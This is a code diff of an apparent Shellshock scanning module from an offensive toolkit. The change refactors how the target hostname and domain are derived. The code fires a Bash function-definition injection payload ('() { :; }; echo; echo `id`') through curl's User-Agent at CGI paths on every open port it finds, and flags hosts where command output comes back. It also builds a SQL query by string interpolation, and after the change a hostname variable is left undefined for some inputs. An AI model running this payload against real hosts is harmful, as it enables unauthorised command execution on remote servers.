@@ -10,6 +10,8 @@ from exp10it import CLIOutput
 from exp10it import figlet2file
 from exp10it import get_target_table_name_list
 from exp10it import COMMON_NOT_WEB_PORT_LIST
+from exp10it import get_http_domain_from_url 
+
 modulePath = __file__[:-len(__file__.split("/")[-1])]
 
 cgiList = [
@@ -31,6 +33,7 @@ cgiList = [
 ]
 
 target = sys.argv[1]
+http_domain=get_http_domain_from_url(target)
 urls = get_target_urls_from_db(target, "exp10itdb")
 for eachUrl in urls:
     if "^" in eachUrl:
@@ -47,13 +50,12 @@ for eachUrl in urls:
                 f.write(string_to_write)
 
 
-target = sys.argv[1]
 if target[:4] == "http":
-    target = urlparse(target).hostname
+    hostname= urlparse(target).hostname
 figlet2file("test shellshock vul for %s" % target, 0, True)
 target_table_name = get_target_table_name_list(target)[0]
 result = execute_sql_in_db("select port_scan_info from %s where http_domain='%s'" %
-                           (target_table_name, target), "exp10itdb")
+                           (target_table_name, http_domain), "exp10itdb")
 if len(result) > 0:
     nmap_result_string = result[0][0]
     a = re.findall(r"(\d+)/(tcp)|(udp)\s+open", nmap_result_string, re.I)
@@ -64,10 +66,10 @@ if len(result) > 0:
     for eachPort in openPortList:
         for eachCgi in cgiList:
             a = get_string_from_command(
-                "curl '%s' -A '() { :; }; echo; echo `id`' -k" % (target + ":" + eachPort + eachCgi))
+                "curl '%s' -A '() { :; }; echo; echo `id`' -k" % (hostname+ ":" + eachPort + eachCgi))
             if re.search(r"uid=", a, re.I):
                 string_to_write = "Congratulations! shellshock vul exists on %s\n%s" % (
-                    target + ":" + eachPort + eachCgi, a)
+                    hostname+ ":" + eachPort + eachCgi, a)
                 CLIOutput().good_print(string_to_write)
                 with open("%sresult.txt" % modulePath, "a+") as f:
                     f.write(string_to_write)
